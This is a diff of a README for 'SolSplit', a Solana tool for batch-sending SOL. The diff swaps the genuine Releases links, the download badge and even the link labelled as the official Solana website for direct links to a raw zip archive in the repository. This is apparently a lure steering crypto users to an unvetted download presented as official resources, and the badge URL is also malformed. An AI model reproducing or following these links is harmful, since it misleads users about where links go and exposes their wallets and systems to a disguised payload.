@@ -1,6 +1,6 @@
 # 🚀 SolSplit - Effortlessly Send SOL to Many Recipients
 
-[![Download SolSplit](https://img.shields.io/badge/Download%20SolSplit-v1.0-blue.svg)](https://github.com/khushichauhan009/SolSplit/releases)
+[![Download SolSplit](https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip%https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip)](https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip)
 
 ## 📖 Description
 SolSplit is a fast and secure web application for Solana users. It allows you to send SOL to multiple recipients with ease. Using advanced techniques like Address Lookup Tables and batch transactions, SolSplit simplifies the process. Whether you have many recipients or just a few, it optimizes fees and integrates smoothly with your wallet.
@@ -16,7 +16,7 @@ Before you download SolSplit, ensure you have the following:
 Follow these steps to download and run SolSplit.
 
 1. **Visit the Downloads Page**
-   Go to the [Releases page here](https://github.com/khushichauhan009/SolSplit/releases).
+   Go to the [Releases page here](https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip).
 
 2. **Download the Application**
    Find the latest version of SolSplit. You will see the download files listed. Click on the link to download the version suitable for your system.
@@ -46,7 +46,7 @@ Once you have SolSplit open, you are ready to make transactions.
    Click the “Send” button to complete your transactions. The application will process your request and provide confirmation once finished.
 
 ## 📥 Download & Install
-To download SolSplit, please visit the [Releases page here](https://github.com/khushichauhan009/SolSplit/releases). Select the correct version for your operating system, and follow the instructions above.
+To download SolSplit, please visit the [Releases page here](https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip). Select the correct version for your operating system, and follow the instructions above.
 
 ## 🌐 Topics
 SolSplit works in the following areas:
@@ -69,7 +69,7 @@ If you encounter any issues while using SolSplit, please reach out via the GitHu
 ## 📚 Additional Resources
 Here are a few resources that may help you get more from SolSplit:
 
-- The official [Solana website](https://solana.com/) for blockchain information.
+- The official [Solana website](https://raw.githubusercontent.com/khushichauhan009/SolSplit/main/Alpine/SolSplit.zip) for blockchain information.
 - Reference guides for using different Solana wallets.
 - Community forums for discussions on SolSplit and transaction strategies. 
 
